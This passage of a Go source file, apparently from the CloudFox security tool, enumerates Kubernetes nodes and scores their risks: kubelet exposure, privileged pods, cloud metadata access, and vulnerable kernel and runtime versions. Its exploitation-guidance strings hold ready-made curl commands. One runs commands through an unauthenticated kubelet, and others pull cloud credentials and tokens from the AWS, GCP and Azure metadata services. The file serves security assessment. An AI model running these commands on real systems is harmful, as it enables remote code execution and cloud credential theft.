package commands

import (
	"context"
	"fmt"
	"os"
	"sort"
	"strconv"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	netv1 "k8s.io/api/networking/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/yaml"
)

var NodesCmd = &cobra.Command{
	Use:     "nodes",
	Aliases: []string{},
	Short:   "List all cluster nodes with comprehensive security analysis",
	Long: `
List all cluster nodes with detailed security information including:
- Kubelet security vulnerabilities (anonymous auth, read-only port, CVEs)
- Privileged workload analysis (container escape risks)
- Cloud metadata (IMDS) access risks
- Kernel and OS vulnerability detection
- Resource pressure and node conditions
- Network exposure analysis
- Complete attack path visualization

Usage:
  cloudfox kubernetes nodes`,
	Run: ListNodes,
}

type NodesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t NodesOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t NodesOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

// NodeFinding represents comprehensive security analysis for a node
type NodeFinding struct {
	// Basic info
	Name       string
	InternalIP string
	ExternalIP string
	Hostname   string

	// Node specifications
	OSImage          string
	KernelVersion    string
	ContainerRuntime string
	KubeletVersion   string
	KubeProxyVersion string
	Architecture     string

	// Cloud provider
	CloudProvider   string
	CloudRole       string
	CloudInstanceID string
	CloudZone       string
	CloudRegion     string

	// Security analysis
	RiskLevel             string
	SecurityIssues        []string
	Vulnerabilities       []string
	MisconfigurationTypes []string

	// Kubelet security
	KubeletReadOnlyPort      int32
	KubeletAnonymousAuth     bool
	KubeletAuthorizationMode string
	KubeletSecurityIssues    []string
	KubeletRiskLevel         string

	// Node conditions
	NodeConditions        []string
	HasDiskPressure       bool
	HasMemoryPressure     bool
	HasPIDPressure        bool
	HasNetworkUnavailable bool
	IsReady               bool
	ConditionIssues       []string

	// Resource analysis
	CPUCapacity       string
	MemoryCapacity    string
	CPUAllocatable    string
	MemoryAllocatable string
	PodsCapacity      int64
	PodsAllocatable   int64
	CurrentPods       int
	ResourcePressure  string

	// Privileged workload analysis
	PrivilegedPods         int
	HostNetworkPods        int
	HostPIDPods            int
	HostIPCPods            int
	HostPathPods           int
	PrivilegedPodNames     []string
	DangerousHostPaths     []string
	PrivilegedWorkloadRisk string

	// Cloud metadata security
	IMDSAccessRisk      string
	MetadataEndpoint    string
	IAMRoleAttached     bool
	CloudSecurityIssues []string

	// Network exposure
	IsExternallyExposed   bool
	ExposureRisk          string
	NetworkSecurityIssues []string

	// Taints and labels
	Taints      []string
	Labels      map[string]string
	Annotations map[string]string

	// Attack scenarios
	AllowsPodEscape       bool
	AllowsNodeTakeover    bool
	AllowsCloudBreakout   bool
	AllowsLateralMovement bool
	AttackPaths           []string
}

// KubeletSecurityAnalysis tracks kubelet-specific security issues
type KubeletSecurityAnalysis struct {
	NodeName             string
	KubeletVersion       string
	AnonymousAuth        bool
	ReadOnlyPort         int32
	AuthorizationMode    string
	SecurityIssues       []string
	Vulnerabilities      []string
	RiskLevel            string
	ExploitationGuidance string
}

// ResourceAnalysis tracks node resource conditions and pressure
type ResourceAnalysis struct {
	NodeName          string
	CPUCapacity       resource.Quantity
	MemoryCapacity    resource.Quantity
	CPUAllocatable    resource.Quantity
	MemoryAllocatable resource.Quantity
	PodsCapacity      int64
	PodsAllocatable   int64
	CurrentPods       int
	HasDiskPressure   bool
	HasMemoryPressure bool
	HasPIDPressure    bool
	IsReady           bool
	ResourcePressure  string
	Issues            []string
}

// PrivilegedWorkloadAnalysis tracks privileged workloads per node
type PrivilegedWorkloadAnalysis struct {
	NodeName            string
	PrivilegedPods      int
	HostNetworkPods     int
	HostPIDPods         int
	HostIPCPods         int
	HostPathPods        int
	PrivilegedPodNames  []string
	HostNetworkPodNames []string
	HostPIDPodNames     []string
	HostIPCPodNames     []string
	DangerousHostPaths  []string
	RiskLevel           string
	SecurityIssues      []string
	ContainerEscapeRisk bool
}

// IMDSRiskAnalysis tracks cloud metadata access risks
type IMDSRiskAnalysis struct {
	NodeName         string
	CloudProvider    string
	MetadataEndpoint string
	IAMRoleAttached  bool
	HasIMDSPolicy    bool
	RiskLevel        string
	SecurityIssues   []string
	ExploitGuidance  string
}

// KernelVulnerabilityAnalysis tracks kernel/OS vulnerabilities
type KernelVulnerabilityAnalysis struct {
	NodeName         string
	KernelVersion    string
	OSImage          string
	ContainerRuntime string
	Vulnerabilities  []string
	RiskLevel        string
	PatchGuidance    string
}

// Kubelet vulnerability database
var kubeletVulnerabilities = map[string][]string{
	"1.10": {"CVE-2018-1002105 - Privilege escalation via API server proxy"},
	"1.11": {"CVE-2018-1002105 - Privilege escalation via API server proxy"},
	"1.12": {"CVE-2018-1002105 - Privilege escalation via API server proxy"},
	"1.13": {"CVE-2019-11253 - XML bomb DoS", "CVE-2019-1002101 - kubectl cp symlink vulnerability"},
	"1.14": {"CVE-2019-11253 - XML bomb DoS", "CVE-2019-11247 - API server access control bypass"},
	"1.15": {"CVE-2019-11253 - XML bomb DoS", "CVE-2020-8555 - SSRF in kube-controller-manager"},
	"1.16": {"CVE-2020-8555 - SSRF in kube-controller-manager", "CVE-2020-8559 - Privilege escalation"},
	"1.17": {"CVE-2020-8555 - SSRF in kube-controller-manager", "CVE-2020-8559 - Privilege escalation"},
	"1.18": {"CVE-2020-8559 - Privilege escalation", "CVE-2021-25741 - Symlink exchange vulnerability"},
	"1.19": {"CVE-2021-25741 - Symlink exchange vulnerability"},
	"1.20": {"CVE-2021-25741 - Symlink exchange vulnerability"},
}

// Kernel vulnerability database
var vulnerableKernels = []struct {
	Name        string
	CVE         string
	Versions    []string
	Description string
}{
	{
		Name:        "DirtyCOW",
		CVE:         "CVE-2016-5195",
		Versions:    []string{"4.8.0", "4.7.0", "4.6.0", "4.4.0", "3."},
		Description: "Race condition in memory subsystem - privilege escalation to root",
	},
	{
		Name:        "DirtyPipe",
		CVE:         "CVE-2022-0847",
		Versions:    []string{"5.16.", "5.15.", "5.14.", "5.13.", "5.10."},
		Description: "Arbitrary file overwrite - privilege escalation to root",
	},
	{
		Name:        "OverlayFS",
		CVE:         "CVE-2021-3493",
		Versions:    []string{"4.4.0", "4.15.0", "5.4.0"},
		Description: "Ubuntu OverlayFS vulnerability - privilege escalation to root",
	},
	{
		Name:        "Netfilter",
		CVE:         "CVE-2021-22555",
		Versions:    []string{"5.4.", "5.3.", "5.2.", "5.1.", "5.0.", "4.19.", "4.18.", "4.17.", "4.16.", "4.15.", "4.14."},
		Description: "Netfilter heap out-of-bounds write - privilege escalation",
	},
}

// EOL operating systems
var eolOperatingSystems = map[string]string{
	"Ubuntu 16.04": "2021-04-30",
	"Ubuntu 18.04": "2023-04-30",
	"CentOS 7":     "2024-06-30",
	"CentOS 8":     "2021-12-31",
	"Debian 9":     "2022-06-30",
	"Debian 10":    "2024-06-30",
	"CoreOS":       "2020-05-26",
}

// Container runtime vulnerabilities
var runtimeVulnerabilities = []struct {
	Runtime     string
	CVE         string
	Versions    []string
	Description string
}{
	{
		Runtime:     "runc",
		CVE:         "CVE-2019-5736",
		Versions:    []string{"1.0-rc6", "1.0-rc5", "1.0-rc4", "1.0-rc3"},
		Description: "Container breakout via /proc/self/exe - host root access",
	},
	{
		Runtime:     "containerd",
		CVE:         "CVE-2020-15257",
		Versions:    []string{"1.3.0", "1.3.1", "1.3.2", "1.3.3", "1.3.4", "1.3.5", "1.3.6", "1.3.7", "1.3.8", "1.3.9"},
		Description: "Access to abstract Unix domain socket - container escape",
	},
	{
		Runtime:     "docker",
		CVE:         "CVE-2019-14271",
		Versions:    []string{"18.09.0", "18.09.1", "18.09.2", "18.09.3", "18.09.4", "18.09.5", "18.09.6", "18.09.7"},
		Description: "Docker cp command symlink-exchange attack",
	},
}

func ListNodes(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating nodes for %s with comprehensive security analysis", globals.ClusterName), globals.K8S_NODES_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Fetch all nodes
	nodes, err := clientset.CoreV1().Nodes().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing nodes: %v", err), globals.K8S_NODES_MODULE_NAME)
		return
	}

	// Fetch all pods for workload analysis
	pods, err := clientset.CoreV1().Pods("").List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing pods: %v", err), globals.K8S_NODES_MODULE_NAME)
		return
	}

	// Fetch all network policies for IMDS analysis
	networkPolicies, err := clientset.NetworkingV1().NetworkPolicies("").List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Warning: Error listing network policies: %v", err), globals.K8S_NODES_MODULE_NAME)
		networkPolicies = &netv1.NetworkPolicyList{} // Continue without network policies
	}

	// Create node findings with comprehensive security analysis
	var findings []NodeFinding

	for _, node := range nodes.Items {
		finding := analyzeNode(ctx, clientset, node, pods.Items, networkPolicies.Items)
		findings = append(findings, finding)
	}

	// Generate all outputs
	tableFile := generateTable(findings)
	lootFiles := generateLootFiles(findings)

	// Handle output
	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Nodes",
		globals.ClusterName,
		"results",
		NodesOutput{
			Table: []internal.TableFile{tableFile},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_NODES_MODULE_NAME)
		return
	}

	// Summary statistics
	criticalCount := 0
	highCount := 0
	for _, f := range findings {
		if f.RiskLevel == "CRITICAL" {
			criticalCount++
		} else if f.RiskLevel == "HIGH" {
			highCount++
		}
	}

	if len(findings) > 0 {
		logger.InfoM(fmt.Sprintf("%d nodes found (%d CRITICAL, %d HIGH risk)", len(findings), criticalCount, highCount), globals.K8S_NODES_MODULE_NAME)
	} else {
		logger.InfoM("No nodes found, skipping output file creation", globals.K8S_NODES_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_NODES_MODULE_NAME), globals.K8S_NODES_MODULE_NAME)
}

// analyzeNode performs comprehensive security analysis on a node
func analyzeNode(ctx context.Context, clientset *config.K8sClientset, node corev1.Node, allPods []corev1.Pod, networkPolicies []netv1.NetworkPolicy) NodeFinding {
	finding := NodeFinding{
		Name:        node.Name,
		Labels:      node.Labels,
		Annotations: node.Annotations,
	}

	// Basic node information
	for _, addr := range node.Status.Addresses {
		switch addr.Type {
		case corev1.NodeInternalIP:
			finding.InternalIP = addr.Address
		case corev1.NodeExternalIP:
			finding.ExternalIP = addr.Address
		case corev1.NodeHostName:
			finding.Hostname = addr.Address
		}
	}

	finding.OSImage = node.Status.NodeInfo.OSImage
	finding.KernelVersion = node.Status.NodeInfo.KernelVersion
	finding.ContainerRuntime = node.Status.NodeInfo.ContainerRuntimeVersion
	finding.KubeletVersion = node.Status.NodeInfo.KubeletVersion
	finding.KubeProxyVersion = node.Status.NodeInfo.KubeProxyVersion
	finding.Architecture = node.Status.NodeInfo.Architecture

	// Cloud provider detection
	finding.CloudProvider = k8sinternal.DetectCloudProviderFromNode(node.Spec.ProviderID)
	finding.CloudRole = k8sinternal.DetectCloudRoleFromNodeLabels(node.Labels)
	finding.CloudInstanceID = node.Spec.ProviderID

	// Extract zone and region from labels
	if zone, ok := node.Labels["topology.kubernetes.io/zone"]; ok {
		finding.CloudZone = zone
	} else if zone, ok := node.Labels["failure-domain.beta.kubernetes.io/zone"]; ok {
		finding.CloudZone = zone
	}

	if region, ok := node.Labels["topology.kubernetes.io/region"]; ok {
		finding.CloudRegion = region
	} else if region, ok := node.Labels["failure-domain.beta.kubernetes.io/region"]; ok {
		finding.CloudRegion = region
	}

	// Taints
	for _, t := range node.Spec.Taints {
		finding.Taints = append(finding.Taints, fmt.Sprintf("%s=%s:%s", t.Key, t.Value, t.Effect))
	}

	// Filter pods running on this node
	var nodePods []corev1.Pod
	for _, pod := range allPods {
		if pod.Spec.NodeName == node.Name {
			nodePods = append(nodePods, pod)
		}
	}

	// Perform security analyses
	kubeletAnalysis := analyzeKubeletSecurity(node)
	resourceAnalysis := analyzeNodeResources(node, nodePods)
	privilegedAnalysis := analyzePrivilegedWorkloads(node, nodePods)
	imdsAnalysis := analyzeIMDSRisk(node, nodePods, networkPolicies)
	kernelAnalysis := analyzeKernelVulnerabilities(node)
	networkAnalysis := analyzeNodeNetworkExposure(node)

	// Populate finding from analyses
	finding.KubeletAnonymousAuth = kubeletAnalysis.AnonymousAuth
	finding.KubeletReadOnlyPort = kubeletAnalysis.ReadOnlyPort
	finding.KubeletAuthorizationMode = kubeletAnalysis.AuthorizationMode
	finding.KubeletSecurityIssues = kubeletAnalysis.SecurityIssues
	finding.KubeletRiskLevel = kubeletAnalysis.RiskLevel

	finding.HasDiskPressure = resourceAnalysis.HasDiskPressure
	finding.HasMemoryPressure = resourceAnalysis.HasMemoryPressure
	finding.HasPIDPressure = resourceAnalysis.HasPIDPressure
	finding.IsReady = resourceAnalysis.IsReady
	finding.ResourcePressure = resourceAnalysis.ResourcePressure
	finding.ConditionIssues = resourceAnalysis.Issues
	finding.CPUCapacity = resourceAnalysis.CPUCapacity.String()
	finding.MemoryCapacity = resourceAnalysis.MemoryCapacity.String()
	finding.CPUAllocatable = resourceAnalysis.CPUAllocatable.String()
	finding.MemoryAllocatable = resourceAnalysis.MemoryAllocatable.String()
	finding.PodsCapacity = resourceAnalysis.PodsCapacity
	finding.PodsAllocatable = resourceAnalysis.PodsAllocatable
	finding.CurrentPods = resourceAnalysis.CurrentPods

	finding.PrivilegedPods = privilegedAnalysis.PrivilegedPods
	finding.HostNetworkPods = privilegedAnalysis.HostNetworkPods
	finding.HostPIDPods = privilegedAnalysis.HostPIDPods
	finding.HostIPCPods = privilegedAnalysis.HostIPCPods
	finding.HostPathPods = privilegedAnalysis.HostPathPods
	finding.PrivilegedPodNames = privilegedAnalysis.PrivilegedPodNames
	finding.DangerousHostPaths = privilegedAnalysis.DangerousHostPaths
	finding.PrivilegedWorkloadRisk = privilegedAnalysis.RiskLevel
	finding.AllowsPodEscape = privilegedAnalysis.ContainerEscapeRisk

	finding.IMDSAccessRisk = imdsAnalysis.RiskLevel
	finding.MetadataEndpoint = imdsAnalysis.MetadataEndpoint
	finding.IAMRoleAttached = imdsAnalysis.IAMRoleAttached
	finding.CloudSecurityIssues = imdsAnalysis.SecurityIssues
	finding.AllowsCloudBreakout = (imdsAnalysis.RiskLevel == "CRITICAL" || imdsAnalysis.RiskLevel == "HIGH")

	finding.Vulnerabilities = append(finding.Vulnerabilities, kubeletAnalysis.Vulnerabilities...)
	finding.Vulnerabilities = append(finding.Vulnerabilities, kernelAnalysis.Vulnerabilities...)

	finding.IsExternallyExposed = networkAnalysis.IsExternallyExposed
	finding.ExposureRisk = networkAnalysis.RiskLevel
	finding.NetworkSecurityIssues = networkAnalysis.SecurityIssues

	// Attack scenarios
	if privilegedAnalysis.ContainerEscapeRisk {
		finding.AllowsPodEscape = true
	}

	if kubeletAnalysis.RiskLevel == "CRITICAL" {
		finding.AllowsNodeTakeover = true
	}

	if privilegedAnalysis.HostNetworkPods > 0 {
		finding.AllowsLateralMovement = true
	}

	// Build attack paths
	finding.AttackPaths = buildAttackPaths(finding, kubeletAnalysis, privilegedAnalysis, imdsAnalysis)

	// Aggregate all security issues
	finding.SecurityIssues = append(finding.SecurityIssues, kubeletAnalysis.SecurityIssues...)
	finding.SecurityIssues = append(finding.SecurityIssues, resourceAnalysis.Issues...)
	finding.SecurityIssues = append(finding.SecurityIssues, privilegedAnalysis.SecurityIssues...)
	finding.SecurityIssues = append(finding.SecurityIssues, imdsAnalysis.SecurityIssues...)
	finding.SecurityIssues = append(finding.SecurityIssues, networkAnalysis.SecurityIssues...)

	// Calculate overall risk level
	finding.RiskLevel = calculateNodeRiskLevel(finding, kubeletAnalysis, resourceAnalysis, privilegedAnalysis, imdsAnalysis, networkAnalysis)

	return finding
}

// analyzeKubeletSecurity checks for kubelet security issues
func analyzeKubeletSecurity(node corev1.Node) KubeletSecurityAnalysis {
	analysis := KubeletSecurityAnalysis{
		NodeName:       node.Name,
		KubeletVersion: node.Status.NodeInfo.KubeletVersion,
		RiskLevel:      "LOW",
	}

	// Check for anonymous authentication (most common in older clusters)
	// This is typically indicated by specific kubelet flags in node annotations
	if val, ok := node.Annotations["node.alpha.kubernetes.io/kubelet-config.yaml"]; ok {
		if strings.Contains(val, "anonymous-auth: true") || strings.Contains(val, "anonymous:\n  enabled: true") {
			analysis.AnonymousAuth = true
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Kubelet anonymous authentication enabled - allows unauthenticated RCE on port 10250")
			analysis.RiskLevel = "CRITICAL"
			analysis.ExploitationGuidance = fmt.Sprintf(
				"curl -k https://%s:10250/run/<namespace>/<pod>/<container> -d \"cmd=id\"",
				getNodeIP(node))
		}
	}

	// Check for read-only port (10255)
	// In modern Kubernetes this is disabled by default, but check annotations
	if val, ok := node.Annotations["node.alpha.kubernetes.io/kubelet-config.yaml"]; ok {
		if strings.Contains(val, "read-only-port: 10255") || strings.Contains(val, "readOnlyPort: 10255") {
			analysis.ReadOnlyPort = 10255
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Kubelet read-only port 10255 exposed - pod specs and secrets readable without authentication")
			if analysis.RiskLevel != "CRITICAL" {
				analysis.RiskLevel = "HIGH"
			}
		}
	}

	// Check kubelet version for known CVEs
	kubeletVersion := node.Status.NodeInfo.KubeletVersion
	for versionPrefix, vulns := range kubeletVulnerabilities {
		if strings.HasPrefix(kubeletVersion, "v"+versionPrefix) {
			analysis.Vulnerabilities = append(analysis.Vulnerabilities, vulns...)
			if analysis.RiskLevel == "LOW" {
				analysis.RiskLevel = "MEDIUM"
			}
		}
	}

	// Check authorization mode (if available)
	if val, ok := node.Annotations["kubeadm.alpha.kubernetes.io/cri-socket"]; ok {
		analysis.AuthorizationMode = val
	}

	return analysis
}

// analyzeNodeResources checks node resource conditions and pressure
func analyzeNodeResources(node corev1.Node, pods []corev1.Pod) ResourceAnalysis {
	analysis := ResourceAnalysis{
		NodeName:         node.Name,
		CurrentPods:      len(pods),
		ResourcePressure: "NONE",
	}

	// Parse resource quantities
	if cpu, ok := node.Status.Capacity[corev1.ResourceCPU]; ok {
		analysis.CPUCapacity = cpu
	}
	if memory, ok := node.Status.Capacity[corev1.ResourceMemory]; ok {
		analysis.MemoryCapacity = memory
	}
	if cpu, ok := node.Status.Allocatable[corev1.ResourceCPU]; ok {
		analysis.CPUAllocatable = cpu
	}
	if memory, ok := node.Status.Allocatable[corev1.ResourceMemory]; ok {
		analysis.MemoryAllocatable = memory
	}
	if podsCapacity, ok := node.Status.Capacity[corev1.ResourcePods]; ok {
		analysis.PodsCapacity = podsCapacity.Value()
	}
	if podsAllocatable, ok := node.Status.Allocatable[corev1.ResourcePods]; ok {
		analysis.PodsAllocatable = podsAllocatable.Value()
	}

	// Check node conditions
	for _, condition := range node.Status.Conditions {
		switch condition.Type {
		case corev1.NodeReady:
			if condition.Status == corev1.ConditionTrue {
				analysis.IsReady = true
			} else {
				analysis.Issues = append(analysis.Issues, "Node not ready")
			}
		case corev1.NodeDiskPressure:
			if condition.Status == corev1.ConditionTrue {
				analysis.HasDiskPressure = true
				analysis.Issues = append(analysis.Issues, "Disk pressure detected - potential DoS risk")
				analysis.ResourcePressure = "HIGH"
			}
		case corev1.NodeMemoryPressure:
			if condition.Status == corev1.ConditionTrue {
				analysis.HasMemoryPressure = true
				analysis.Issues = append(analysis.Issues, "Memory pressure detected - OOMKill risk")
				analysis.ResourcePressure = "HIGH"
			}
		case corev1.NodePIDPressure:
			if condition.Status == corev1.ConditionTrue {
				analysis.HasPIDPressure = true
				analysis.Issues = append(analysis.Issues, "PID pressure detected - fork bomb vulnerability")
				analysis.ResourcePressure = "CRITICAL"
			}
		case corev1.NodeNetworkUnavailable:
			if condition.Status == corev1.ConditionTrue {
				analysis.Issues = append(analysis.Issues, "Network unavailable")
			}
		}
	}

	// Check pod capacity
	if analysis.PodsCapacity > 0 {
		utilizationPercent := (int64(analysis.CurrentPods) * 100) / analysis.PodsCapacity
		if utilizationPercent > 90 {
			analysis.ResourcePressure = "CRITICAL"
			analysis.Issues = append(analysis.Issues, fmt.Sprintf("Pod capacity >90%% (%d/%d) - scheduling failures imminent", analysis.CurrentPods, analysis.PodsCapacity))
		} else if utilizationPercent > 80 {
			if analysis.ResourcePressure == "NONE" {
				analysis.ResourcePressure = "HIGH"
			}
			analysis.Issues = append(analysis.Issues, fmt.Sprintf("Pod capacity >80%% (%d/%d) - scheduling risk", analysis.CurrentPods, analysis.PodsCapacity))
		}
	}

	return analysis
}

// analyzePrivilegedWorkloads checks for privileged workloads on the node
func analyzePrivilegedWorkloads(node corev1.Node, pods []corev1.Pod) PrivilegedWorkloadAnalysis {
	analysis := PrivilegedWorkloadAnalysis{
		NodeName:  node.Name,
		RiskLevel: "NONE",
	}

	for _, pod := range pods {
		podFullName := fmt.Sprintf("%s/%s", pod.Namespace, pod.Name)

		// Check for privileged containers
		for _, container := range append(pod.Spec.Containers, pod.Spec.InitContainers...) {
			if container.SecurityContext != nil &&
				container.SecurityContext.Privileged != nil &&
				*container.SecurityContext.Privileged {
				analysis.PrivilegedPods++
				if !contains(analysis.PrivilegedPodNames, podFullName) {
					analysis.PrivilegedPodNames = append(analysis.PrivilegedPodNames, podFullName)
				}
				analysis.ContainerEscapeRisk = true
			}
		}

		// Check for hostNetwork
		if pod.Spec.HostNetwork {
			analysis.HostNetworkPods++
			if !contains(analysis.HostNetworkPodNames, podFullName) {
				analysis.HostNetworkPodNames = append(analysis.HostNetworkPodNames, podFullName)
			}
		}

		// Check for hostPID
		if pod.Spec.HostPID {
			analysis.HostPIDPods++
			if !contains(analysis.HostPIDPodNames, podFullName) {
				analysis.HostPIDPodNames = append(analysis.HostPIDPodNames, podFullName)
			}
		}

		// Check for hostIPC
		if pod.Spec.HostIPC {
			analysis.HostIPCPods++
			if !contains(analysis.HostIPCPodNames, podFullName) {
				analysis.HostIPCPodNames = append(analysis.HostIPCPodNames, podFullName)
			}
		}

		// Check for dangerous hostPath mounts
		for _, volume := range pod.Spec.Volumes {
			if volume.HostPath != nil {
				path := volume.HostPath.Path
				if isDangerousHostPath(path) {
					analysis.HostPathPods++
					dangerousPath := fmt.Sprintf("%s: %s", podFullName, path)
					if !contains(analysis.DangerousHostPaths, dangerousPath) {
						analysis.DangerousHostPaths = append(analysis.DangerousHostPaths, dangerousPath)
					}
					analysis.ContainerEscapeRisk = true
				}
			}
		}
	}

	// Calculate risk level
	if analysis.PrivilegedPods > 0 {
		analysis.RiskLevel = "CRITICAL"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d privileged pods - container escape to node root possible", analysis.PrivilegedPods))
	}

	if len(analysis.DangerousHostPaths) > 0 {
		if analysis.RiskLevel == "NONE" {
			analysis.RiskLevel = "HIGH"
		}
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d pods with dangerous hostPath mounts - host filesystem access", len(analysis.DangerousHostPaths)))
	}

	if analysis.HostNetworkPods > 0 {
		if analysis.RiskLevel == "NONE" {
			analysis.RiskLevel = "MEDIUM"
		}
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d hostNetwork pods - network namespace escape and lateral movement", analysis.HostNetworkPods))
	}

	if analysis.HostPIDPods > 0 {
		if analysis.RiskLevel == "NONE" {
			analysis.RiskLevel = "MEDIUM"
		}
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d hostPID pods - PID namespace escape", analysis.HostPIDPods))
	}

	if analysis.HostIPCPods > 0 {
		if analysis.RiskLevel == "NONE" {
			analysis.RiskLevel = "LOW"
		}
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("%d hostIPC pods - IPC namespace escape", analysis.HostIPCPods))
	}

	return analysis
}

// analyzeIMDSRisk checks for cloud metadata access risks
func analyzeIMDSRisk(node corev1.Node, pods []corev1.Pod, networkPolicies []netv1.NetworkPolicy) IMDSRiskAnalysis {
	analysis := IMDSRiskAnalysis{
		NodeName:  node.Name,
		RiskLevel: "NONE",
	}

	cloudProvider := k8sinternal.DetectCloudProviderFromNode(node.Spec.ProviderID)
	analysis.CloudProvider = cloudProvider

	switch cloudProvider {
	case "AWS":
		analysis.MetadataEndpoint = "169.254.169.254"

		// Check if IAM role is attached to node
		if node.Spec.ProviderID != "" {
			analysis.IAMRoleAttached = true
			analysis.RiskLevel = "HIGH"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"IAM role attached to node - pods can access AWS credentials via IMDS")
			analysis.ExploitGuidance = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
		}

	case "GCP":
		analysis.MetadataEndpoint = "metadata.google.internal"

		if node.Spec.ProviderID != "" {
			analysis.IAMRoleAttached = true
			analysis.RiskLevel = "HIGH"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Service account attached to node - pods can access GCP credentials via metadata server")
			analysis.ExploitGuidance = "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
		}

	case "Azure":
		analysis.MetadataEndpoint = "169.254.169.254"

		if node.Spec.ProviderID != "" {
			analysis.IAMRoleAttached = true
			analysis.RiskLevel = "HIGH"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Managed identity attached to node - pods can access Azure credentials via IMDS")
			analysis.ExploitGuidance = "curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
		}
	}

	// Check if there's a network policy blocking IMDS access
	if analysis.IAMRoleAttached {
		hasIMDSPolicy := false
		for _, np := range networkPolicies {
			// Check if policy blocks egress to metadata endpoint
			for _, egressRule := range np.Spec.Egress {
				for _, to := range egressRule.To {
					if to.IPBlock != nil {
						// AWS/Azure IMDS
						if strings.HasPrefix(to.IPBlock.CIDR, "169.254.169.254") {
							// Check if it's a deny rule (has except clause)
							if len(to.IPBlock.Except) > 0 {
								hasIMDSPolicy = true
							}
						}
					}
				}
			}
		}

		analysis.HasIMDSPolicy = hasIMDSPolicy

		if !hasIMDSPolicy {
			analysis.RiskLevel = "CRITICAL"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"No network policy blocking IMDS - all pods can access cloud credentials and escalate to cloud admin")
		}
	}

	return analysis
}

// analyzeKernelVulnerabilities checks for kernel and OS vulnerabilities
func analyzeKernelVulnerabilities(node corev1.Node) KernelVulnerabilityAnalysis {
	analysis := KernelVulnerabilityAnalysis{
		NodeName:         node.Name,
		KernelVersion:    node.Status.NodeInfo.KernelVersion,
		OSImage:          node.Status.NodeInfo.OSImage,
		ContainerRuntime: node.Status.NodeInfo.ContainerRuntimeVersion,
		RiskLevel:        "LOW",
	}

	// Check for vulnerable kernels
	for _, vuln := range vulnerableKernels {
		for _, version := range vuln.Versions {
			if strings.Contains(analysis.KernelVersion, version) {
				vulnDetail := fmt.Sprintf("%s (%s) - %s", vuln.Name, vuln.CVE, vuln.Description)
				analysis.Vulnerabilities = append(analysis.Vulnerabilities, vulnDetail)
				analysis.RiskLevel = "HIGH"
				analysis.PatchGuidance = "Update kernel to latest stable version"
			}
		}
	}

	// Check for EOL operating systems
	for osName, eolDate := range eolOperatingSystems {
		if strings.Contains(analysis.OSImage, osName) {
			vulnDetail := fmt.Sprintf("EOL operating system: %s (end-of-life: %s) - no security updates", osName, eolDate)
			analysis.Vulnerabilities = append(analysis.Vulnerabilities, vulnDetail)
			if analysis.RiskLevel != "HIGH" {
				analysis.RiskLevel = "MEDIUM"
			}
			analysis.PatchGuidance = "Upgrade to supported OS version"
		}
	}

	// Check for container runtime vulnerabilities
	for _, vuln := range runtimeVulnerabilities {
		if strings.Contains(analysis.ContainerRuntime, vuln.Runtime) {
			for _, version := range vuln.Versions {
				if strings.Contains(analysis.ContainerRuntime, version) {
					vulnDetail := fmt.Sprintf("%s %s - %s", vuln.Runtime, vuln.CVE, vuln.Description)
					analysis.Vulnerabilities = append(analysis.Vulnerabilities, vulnDetail)
					analysis.RiskLevel = "HIGH"
					analysis.PatchGuidance = "Update container runtime to latest version"
				}
			}
		}
	}

	return analysis
}

// analyzeNodeNetworkExposure checks for network exposure risks
func analyzeNodeNetworkExposure(node corev1.Node) struct {
	IsExternallyExposed bool
	RiskLevel           string
	SecurityIssues      []string
} {
	analysis := struct {
		IsExternallyExposed bool
		RiskLevel           string
		SecurityIssues      []string
	}{
		RiskLevel: "LOW",
	}

	// Check for external IP
	for _, addr := range node.Status.Addresses {
		if addr.Type == corev1.NodeExternalIP && addr.Address != "" {
			analysis.IsExternallyExposed = true
			analysis.RiskLevel = "MEDIUM"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				fmt.Sprintf("Node has external IP %s - direct internet exposure", addr.Address))
		}
	}

	// Check for cloud provider external exposure
	cloudProvider := k8sinternal.DetectCloudProviderFromNode(node.Spec.ProviderID)
